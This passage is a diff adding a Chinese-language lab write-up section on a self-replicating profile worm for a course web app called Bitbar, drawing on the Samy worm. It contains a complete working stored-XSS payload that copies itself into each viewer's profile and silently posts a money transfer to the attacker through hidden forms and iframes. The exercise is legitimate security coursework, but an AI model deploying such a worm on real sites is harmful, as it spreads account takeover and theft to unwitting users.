@@ -14,6 +14,7 @@
     + [Exploit Charlie Session Hijacking with Cookies](#exploit-charlie-session-hijacking-with-cookies)
     + [Exploit Delta Cooking the Books with Cookies](#exploit-delta-cooking-the-books-with-cookies)
     + [Exploit Echo SQL Injection](#exploit-echo-sql-injection)
+    + [Exploit Foxtrot Profile Worm](#exploit-foxtrot-profile-worm)
 
 # Proj1
 ## Target1 Buffer overflow
@@ -1272,4 +1273,89 @@ router.get('/close', asyncMiddleware(async (req, res, next) => {
   render(req, res, next, 'index', 'Bitbar Home', 'Deleted account successfully!');
   logDatabaseState();
 }));
+```
+
+## Exploit Foxtrot Profile Worm
+题目要求，`attacker`在自己的profile上post自己的profile，其他用户如`user1`访问了`attacker`的profile时，会自动给`attacker`转账一块钱，然后复制这个worm，从而可以感染其他访问`user1`的无辜用户
+
+- 可参考著名的**Samy Worm**蠕虫病毒，20小时感染一百万账户，牛逼的不行💯，以及他自己写的代码解析
+- [Wikipedia: 萨米 (计算机蠕虫)](https://zh.wikipedia.org/wiki/%E8%90%A8%E7%B1%B3_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A0%95%E8%99%AB))
+- [MySpace Worm Explanation](https://samy.pl/myspace/tech.html)
+
+首先，看下profile是怎样表示的，没有任何处理直接把`result.profile`贴进HTML，和之前方法一样直接注入HTML攻击
+```html
+    <% if (result.username && result.profile) { %>
+        <div id="profile"><%- result.profile %></div>
+    <% } %>
+```
+与之前`b.html`的方法完全类似
+
+- **复制病毒**
+
+`<body>`有个`onload`事件，会运行`load()`，这时候会把`textarea`的东西填满，然后提交表格，也就是把这个profile worm复制到自己的profile中。这里卡了好久，一开始想写一个函数，可以返回函数本体，然后陷入了无穷嵌套根本绕不出来😕去看下Samy大神是做self replicate的
+>
+5) In order to post the code to the user's profile who is viewing it, we need to actually get the source of the page. Ah, we can use document.body.innerHTML in order to get the page source which includes, in only one spot, the ID of the user viewing the page. Myspace gets me again and strips out the word "innerHTML" anywhere. To avoid this, we use an eval() to evaluate two strings and put them together to form "innerHTML". 
+Example: alert(eval('document.body.inne' + 'rHTML'));
+>
+
+妈呀，好机智，直接用innerHTML不就好了嘛，最蠢的方法，最外面包一个`<div id='forge>...</div>`就可以拿出一整块HTML代码啦啦啦
+```javascript
+var textarea = "<div id='forge'>".concat(document.getElementById('forge').innerHTML).concat("</div>");
+```
+但是发现，这样做其实是不够的，因为拿innerHTML时候，`<body>` tag就木有了，试了一下只有`<body onload>`的onload最好用，用个很傻的方法，在`<form></form>`外面包上两个hidden的`<p>` tag，然后替换他们时候加上`<body onload>`，具体如下
+```javascript
+var textarea = "<div id='forge'>".concat(document.getElementById('forge').innerHTML).concat("</div>")
+  .replace('<p hidden="">hello</p>', '<p hidden="">hello</p><body onload="load()">')
+  .replace('<p hidden="">byebye</p>', '<p hidden="">byebye</p></body>');
+```
+这样就能保证每次都能复制worm病毒啦啦啦
+
+- **提交form**
+
+与之前的类似，提交form的逻辑是，首先调用`load()`，提交`<form id="worm" target="iframe1" ...>`并把刷新结果指向隐藏的`iframe1`，然后调用`transferMoney()`，提交`<form id="transfer" target="iframe2" ...>`并把刷新结果指向隐藏的`iframe2`
+
+完整的profile worm代码如下所示，尽情地传播吧~我的蠕虫🐛~嘻嘻😆
+```html
+<div id="forge">
+    Money money I want money
+<script type="text/javascript">
+    var loadDone = false;
+    var transferDone = false;
+    function load() {
+        console.log("load");
+        document.getElementById("new_textarea").value = textarea;
+        document.getElementById("worm").submit();
+        loadDone = true;
+    }
+    function transferMoney() {
+        console.log("transfer load");
+        if (loadDone) {
+            console.log("transfer");
+            document.getElementById("transfer").submit();
+            transferDone = true;
+        }
+    }
+    function bye() {
+        if (transferDone) {
+        }
+    }
+</script>
+<body onload="load()">
+    <p hidden="">hello</p>
+    <form id="worm" method="POST" target="iframe1" action="http://localhost:3000/set_profile">
+        <textarea id="new_textarea" name="new_profile" style="display:none;"></textarea>
+    </form>
+    <form id="transfer" method="POST" target="iframe2" action="http://localhost:3000/post_transfer">
+        <input name="destination_username" type="hidden" value="attacker">
+        <input name="quantity" type="hidden" value="1">
+    </form>
+    <iframe style="width:0; height:0; border:0; border:none" name="iframe1" onload="transferMoney()"></iframe>
+    <iframe style="width:0; height:0; border:0; border:none" name="iframe2" onload="bye()"></iframe>
+    <p hidden="">byebye</p>
+</body>
+
+<script type="text/javascript">
+    var textarea = "<div id='forge'>".concat(document.getElementById('forge').innerHTML).concat("</div>").replace('<p hidden="">hello</p>', '<p hidden="">hello</p><body onload="load()">').replace('<p hidden="">byebye</p>', '<p hidden="">byebye</p></body>');
+</script>
+</div>
 ```
